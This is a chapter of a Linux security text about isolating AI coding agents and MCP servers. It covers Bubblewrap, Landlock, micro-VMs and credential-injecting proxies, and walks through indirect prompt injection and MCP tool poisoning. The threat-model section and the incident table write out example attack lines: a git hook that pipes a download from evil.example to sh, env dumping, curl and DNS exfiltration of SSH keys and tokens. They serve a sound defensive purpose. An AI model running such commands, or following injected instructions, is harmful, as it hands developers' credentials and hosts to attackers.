# Isolating AI Coding Agents, MCP Servers, and Untrusted Code Execution

## Overview

* **Link in the Chain:** Synthesizes `Landlock` ([Chapter 7](07-stacked-lsms-landlock.md)), user/mount/net namespaces ([Chapters 9](09-capabilities-userns.md) and [14](14-containers-escapes.md)), `gVisor` / `Firecracker` micro-VMs ([Chapter 15](15-gvisor-microvms.md)), and workload identity ([Chapter 16](16-workload-identity-spiffe.md)) to confine autonomous AI coding agents, `Model Context Protocol` (`MCP`) servers, and LLM code interpreters on Linux.
* **Core Security Invariant:** Because Large Language Models cannot deterministically separate operator instructions from untrusted data (`Indirect Prompt Injection`), the execution substrate treats the agent shell and every `MCP` server as adversarial code: `.git/hooks`, `.git/config`, and shell dotfiles are mounted read-only; host home credentials are unmapped; outbound network/DNS egress defaults to deny; and real API bearer tokens reside exclusively inside an out-of-sandbox credential-injecting reverse proxy.
* **Deployment Profile Matrix:** Local Linux developer CLI agents (`Codex CLI`, `Claude Code`, `Copilot CLI`) compose unprivileged `Landlock` (`ABI v4..v7`) + `Bubblewrap` (`bwrap`) + `seccomp`; cloud autonomous coding agents (`GitHub Copilot Coding Agent`) and code interpreters (`E2B`, `Modal`, `Cloud Run`) isolate each session inside an ephemeral `Firecracker` / `gVisor` micro-VM behind a host egress firewall and credential proxy.
* **Trusted Computing Base (TCB):** Linux kernel `Landlock`, `seccomp-BPF`, and `VFS` read-only bind mounts (local CLI tier) or `KVM` + `Firecracker` / `gVisor` (cloud VM tier), isolated network namespace / `vsock` firewall, and the out-of-sandbox HTTP/TLS credential-injecting proxy + human approval gate.
* **Integration Seam & Handoff:** Contains prompt-injected command execution, blocks silent `.git/hooks` host persistence, and prevents raw API-key exfiltration even under arbitrary guest shell control; hands off protection of sensitive model weights and prompts *against an untrusted cloud host* to Confidential VMs and Confidential Containers ([Chapters 18](18-confidential-vms-svsm.md) and [19](19-confidential-containers.md)).

## Problem Statement & Threat Model

Between 2024 and 2026, Linux quietly acquired a brand-new class of privileged userspace workload: autonomous AI coding agents, `Model Context Protocol` (`MCP`) tool servers, and LLM code-execution sandboxes [134, 135, 137, 139]. Millions of times each day, developers run local terminal agents (`GitHub Copilot CLI`, `OpenAI Codex CLI`, `Anthropic Claude Code`) directly inside `/home/alice/repos/app`, or dispatch cloud background agents (`Copilot Coding Agent`) that spin up Linux environments, clone repositories, attach `stdio` or remote HTTP/SSE `MCP` servers (connecting databases, Slack, Sentry, GitHub, and cloud CLIs [135]), synthesize multi-step `bash` and Python scripts, install `npm`/`pip`/`cargo` packages, and run test suites autonomously.

Why do traditional application security assumptions collapse completely on an AI agent? Because of Indirect Prompt Injection (`Cross-Domain Prompt Injection`, `XPIA` [134, 138]). Classical programs maintain a strict architectural separation between *code* (the trusted binary verified by `dm-verity` and `IPE`) and *data* (an untrusted JSON string or GitHub issue body). Inside a Transformer-based Large Language Model, instructions and untrusted external data share a single flat token sequence: when an agent reads a public GitHub issue, inspects a third-party pull-request diff, fetches a web page, reads an untrusted `MCP` server's tool docstring (*MCP Tool Poisoning* / "rug-pull" schema mutation [135, 138]), or parses compiler output from an untrusted repo, hidden adversarial instructions embedded in that data can hijack the model's next `bash` or file-write tool call!

![Figure: Three-vector threat anatomy of an unsandboxed AI coding agent or MCP server on Linux under Indirect Prompt Injection (XPIA): persistent host escape via .git/hooks and dotfiles, ambient API-key theft from env/home, and covert network/DNS exfiltration.](diagrams/17-ai-agent-xpia-threat-surface.svg)

Trace what happens in under two seconds when a prompt-injected agent runs *unsandboxed* inside a Linux developer's normal shell (`UID 1000`), even with zero kernel exploits and zero `SUID` bugs [137, 138]:
First, *Persistent Host Escape via `.git` and Dotfiles*: suppose a naive wrapper blocks the `bash` tool on risky commands while letting the `write_file` tool edit "any file inside the workspace `./repo`". The injected agent simply writes `#!/bin/sh\ncurl -s https://evil.example/p | sh\n` into `./repo/.git/hooks/post-checkout` or sets `fsmonitor = "..."` / `sshCommand = "..."` inside `./repo/.git/config` (or edits `.vscode/tasks.json`, `.mcp.json`, `Makefile`, or `~/.bashrc`)! Five minutes later, when the human developer types `git status` or `git diff` in their *unsandboxed* host terminal, `git` automatically executes `core.fsmonitor` with the developer's full host authority, SSH agent, and desktop keyring [137, 138]!
Second, *Ambient Credential Exfiltration*: if `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GITHUB_TOKEN`, or `AWS_SESSION_TOKEN` sits inside the agent's `envp` (`process.env`) or `~/.aws/credentials`, a one-line `env | base64` inside any `pytest` or `npm test` subprocess steals the raw bearer token instantly.
Third, *Covert Egress Channels*: even if HTTP `POST` to unknown domains is discouraged in system prompts, `curl https://allowed-cdn.example/$(cat ~/.ssh/id_ed25519 | tr -d '\n')` or `dig $(xxd -p -c 30 .env).evil.example` exfiltrates secrets over DNS UDP port `53`!

> **Key Principle.**
> System prompts, output classifiers, and LLM "alignment guardrails" are probabilistic heuristics, never security boundaries [134, 137]. Every Linux system hosting an AI agent or `MCP` server must enforce deterministic isolation in the Linux kernel, VFS mount table, network stack, and out-of-process credential proxy below the agent, assuming the agent process is already controlled by an adversary.

## Kernel & Userspace Mechanics

### Tier 1 (Local Workstation CLI): Unprivileged `Bubblewrap` + `Landlock` + Read-Only `.git` Carveouts

On a developer's Linux laptop, spinning up a full `KVM` virtual machine for every 200-millisecond CLI shell command can introduce friction when `/dev/kvm` or root daemons are absent. Modern CLI agents (`Codex CLI` Linux sandbox, `Bubblewrap`-wrapped `Claude Code` / `MCP` launchers [136, 137]) therefore compose three *100% unprivileged* Linux kernel primitives (`Bubblewrap` `bwrap(1)` [136], `Landlock ABI v4..v7` [64, 66], and `seccomp-BPF` [116]) before invoking any LLM-generated command or third-party `stdio` `MCP` server:

First, `bwrap` invokes `unshare(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWPID | CLONE_NEWIPC | CLONE_NEWNET)` with `prctl(PR_SET_PDEATHSIG, SIGKILL)` (`--die-with-parent` so runaway background daemons spawned by the agent cannot outlive the session!) and `prctl(PR_SET_NO_NEW_PRIVS, 1)` [93, 136]. Inside a fresh `tmpfs` root (`pivot_root`), `bwrap` constructs an explicit allowlist VFS view: `/usr`, `/lib`, `/lib64`, `/bin`, and `/etc/alternatives` + `/etc/resolv.conf` are bind-mounted read-only (`--ro-bind`); `/home/alice` is not mounted at all (so `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/gh`, and browser cookies simply do not exist in the agent's VFS namespace!); and the target project directory `/home/alice/repos/app` is bind-mounted read-write (`--bind`), immediately overlaid with read-only bind-mount carveouts over its executable control planes [136, 137]:

```text
--bind     ./repo              /workspace
--ro-bind  ./repo/.git/hooks   /workspace/.git/hooks
--ro-bind  ./repo/.git/config  /workspace/.git/config
--ro-bind  ./repo/.vscode      /workspace/.vscode
--ro-bind  ./repo/.mcp.json    /workspace/.mcp.json
```

Look at the surgical precision of stacking `--ro-bind ./repo/.git/hooks` *on top of* writable `/workspace`: the agent can still run `git diff`, `git log`, `git add`, and `git commit` (mutating `.git/index` and `.git/objects/`), yet any attempt by a prompt-injected script to modify `.git/hooks/*` or inject `core.fsmonitor` into `.git/config` fails deterministically in Ring 0 VFS with `-EROFS` (Read-only file system)! Where `CLONE_NEWUSER` is restricted by Ubuntu 24.04's `AppArmor` gate ([Chapter 9](09-capabilities-userns.md): `bwrap` ships with a pre-installed `/etc/apparmor.d/bwrap` profile on Ubuntu!), or as a defense-in-depth second layer inside the process itself, the agent applies `Landlock` (`ABI v4..v6`) [64, 66]: locking filesystem writes strictly to the `/workspace` and `/tmp` directory FDs, blocking device `ioctl`s (`ABI v5` `LANDLOCK_ACCESS_FS_IOCTL_DEV`), blocking abstract UNIX socket escapes to the host D-Bus / X11 / GNOME Keyring (`ABI v6` `LANDLOCK_SCOPE_ABSTRACT_UNIX_SOCKET` closing the desktop secret-scraping seam from [Chapter 12](12-keyrings-systemd-creds.md)!), and denying TCP `connect()`/`bind()` (`ABI v4`)!

### Tier 2 (Cloud Agents & Code Interpreters): Ephemeral Micro-VMs + Credential-Injecting Proxies

When autonomous agents run unattended in the cloud (`GitHub Copilot Coding Agent` [137]) or execute arbitrary user-submitted Python/C++/Bash code in multi-tenant SaaS (`E2B`, `Modal`, `Vertex`/`Cloud Run` sandboxes [139]), sharing the host kernel via `bwrap`/`Landlock` alone leaves the ~300-syscall Ring 0 surface exposed. Cloud platforms therefore wrap every single agent session inside an ephemeral, single-tenant `Firecracker` / `Kata` micro-VM or `gVisor` sandbox ([Chapter 15](15-gvisor-microvms.md)), torn down and wiped at session end: paired with an architectural breakthrough that solves API-key exfiltration permanently: the Out-of-Sandbox Credential-Injecting Reverse Proxy [137]!

![Figure: Zero-raw-key AI agent sandbox architecture: isolating untrusted agent and MCP execution inside Landlock/Bubblewrap or an ephemeral Firecracker micro-VM with default-deny egress, routing allowed API calls through a host-resident credential-injecting reverse proxy.](diagrams/17-agent-sandbox-cred-proxy.svg)

Examine how this four-stage pipeline defeats `XPIA` secret theft even if an attacker achieves 100% arbitrary root code execution inside the agent VM [137]. First, zero real secrets reside inside the sandbox: inside the micro-VM or `bwrap` namespace, `GITHUB_TOKEN`, `OPENAI_API_KEY`, and cloud registry credentials are either completely omitted or set to synthetic dummy placeholders (`ghp_PLACEHOLDER_PROXY_INJECTED_000000`), so dumping `/proc/*/environ`, reading disk, or attaching `gdb` to the agent process inside the VM yields zero usable credentials. Second, the sandbox enforces default-deny network and DNS egress: its network namespace (`CLONE_NEWNET` or `Firecracker` `tap` interface governed by host `nftables`) has zero direct internet routing and zero arbitrary UDP `53` DNS resolution (killing DNS-tunneling exfiltration), exposing only an explicit proxy socket (`AF_VSOCK` or `169.254.x.y:8080` host listener). Third, when the agent runs `git push origin copilot/fix-bug` or fetches a `PyPI`/`crates.io` package, the request hits the host credential-brokering proxy running outside the VM, which evaluates a strict L7 policy allowlist: `pypi.org` and `files.pythonhosted.org` allow `GET` only (`POST`/`PUT` blocked so source code cannot be uploaded to a rogue package), arbitrary internet domains (`evil.example`, `webhook.site`, `pastebin.com`) are rejected with `403 Forbidden`, and `api.github.com` / `github.com` Git smart-HTTP pushes are parsed at the Git packfile and ref protocol layer so the agent can push strictly to its designated `copilot/*` feature branch on the single target repository, never to `main`, never modifying `.github/workflows/*.yml` CI files (protecting GitHub Actions OIDC secrets), and never reading unrelated private repositories [137]. Fourth, only after the outbound request passes every domain, path, HTTP method, and Git ref rule does the host proxy originate the upstream TLS session and inject `Authorization: Bearer <real-short-lived-token>` on the wire to `api.github.com` or the LLM gateway [137], allowing the agent to exercise delegated capability without ever possessing the underlying key.

Similarly, every third-party `MCP` Server [135] must be isolated in its own separate sandbox with its own narrow proxy policy rather than sharing a flat process tree: a filesystem `MCP` server gets `Landlock` access to one folder and *zero* network access (`unshare -n`), while a Slack or Sentry `MCP` server runs in an empty filesystem (`DynamicUser` / `bwrap`) able to connect *only* to `slack.com` via the host proxy!

## Distro, Immutable-OS, & Cloud Trade-Offs

On developer Linux laptops, combining `Bubblewrap` (`bwrap`) + `Landlock ABI v5/v6` + `unshare(CLONE_NEWNET)` routed over a user-space `slirp4netns` / UNIX-socket HTTP proxy adds `< 5 ms` startup latency per command and works out of the box on Fedora, Arch, Debian, and Ubuntu (`24.04+` via `/etc/apparmor.d/bwrap`) [66, 85, 136]. In cloud CI and hosted agent fleets, `Firecracker` snapshot-restored micro-VMs (`< 10 ms` warm boot on bare-metal `.metal` or nested-KVM cloud nodes [123]) or `gVisor` (`runsc` when `/dev/kvm` is unavailable [122]) provide multi-tenant Ring 0 isolation alongside host `nftables` + Envoy/Rust credential-injecting proxies [137, 139].

## Seam Failures, CVEs, & Structural Bounds

Real-world AI agent and `MCP` sandbox escapes exploit unprotected `.git`/CI files inside writable workspaces, raw API keys passed via environment variables, cross-`MCP` tool poisoning, and unrestricted DNS/HTTP egress.

| Incident / CVE | Year | Subsystem | Broken Assumption | Exploit Mechanism | Architectural Fix |
|---|---|---|---|---|---|
| `.git/hooks` & `.git/config` `fsmonitor` Host Escape | 2024-2025 | Workspace-scoped CLI agents | Restricting edits to `./repo/**` prevents host code execution | `XPIA` writes `.git/hooks/pre-commit` or `.git/config` `core.fsmonitor`, running unsandboxed when human types `git status` | Overlay `--ro-bind` read-only mounts on `.git/hooks`, `.git/config`, `.vscode`, and `.github/workflows` [136, 137, 138] |
| Environment-Variable API Key Exfiltration | 2023-2025 | Agent `env` + allowed `GET` URLs / DNS | Agent needs `OPENAI_API_KEY` / `GITHUB_TOKEN` in `process.env` | Prompt injection runs `curl https://allowed.site/$GITHUB_TOKEN` or DNS hex-label lookup | Strip all raw secrets from sandbox; inject headers in host-side reverse proxy + block direct DNS [134, 137] |
| `MCP` Tool Poisoning & Rug-Pulls | 2025 | Untrusted `stdio`/SSE `MCP` servers | `MCP` tool JSON descriptions are passive UI metadata | Malicious `MCP` server hides prompt-injection directives in tool schema to steal files via sibling `MCP` tools | Pin signed `MCP` manifest hashes, isolate each `MCP` server in its own `bwrap`/`Landlock` sandbox, and gate cross-server flows [135, 138] |
| `GitHub Actions` `.github/workflows` Escalation | 2024-2025 | Cloud coding agents with repo push access | Pushing to a PR branch cannot steal production deployment secrets | Compromised agent edits `.github/workflows/ci.yml` to run on `pull_request_target` / branch push and dump CI secrets | Enforce Git packfile/ref filter in host proxy forbidding `.github/workflows/**` modifications by agents [137] |

Look at the symmetry we have reached at the end of [Chapter 17](17-ai-agent-sandboxes.md): Chapters 14 through 17 protect the Linux host and its secrets from an untrusted guest workload. Now invert the threat model completely! What if *your workload* (proprietary multi-billion-dollar AI model weights, regulated healthcare/financial records, or root CA keys) is trusted, while the cloud host hypervisor, physical DRAM bus, and Kubernetes worker-node administrator are untrusted or compromised? Chapters 18 and 19 flip the Linux trust chain inside out through Confidential Computing.

## Inspecting on a Live Linux Host

Verify that `bubblewrap` (`bwrap`) can construct an unprivileged isolated mount, PID, and loopback-only network namespace with `.git/config` mounted read-only (runs with zero `root` privileges):

```bash
bwrap --ro-bind /usr /usr --symlink usr/bin /bin --symlink usr/lib /lib --symlink usr/lib64 /lib64 --proc /proc --dev /dev --tmpfs /tmp --unshare-all --die-with-parent /bin/id 2>/dev/null || echo "bwrap unavailable or gated by AppArmor"
```

Confirm within a two-line test that an unshared network namespace (`unshare -rn`) has zero external routes or DNS reachability (default-deny egress):

```bash
unshare -rn ip addr show 2>/dev/null | head -n 6 || true
```

Check Ubuntu/AppArmor `bwrap` profile status and verify `Landlock` `ABI v5/v6` (`ioctl` + abstract-socket scoping) support (`ABI >= 6` on Linux `6.12+`):

```bash
ls -la /etc/apparmor.d/bwrap 2>/dev/null || true
python3 -c 'import ctypes; print("Landlock ABI:", ctypes.CDLL(None).syscall(444, None, 0, 1))'
```
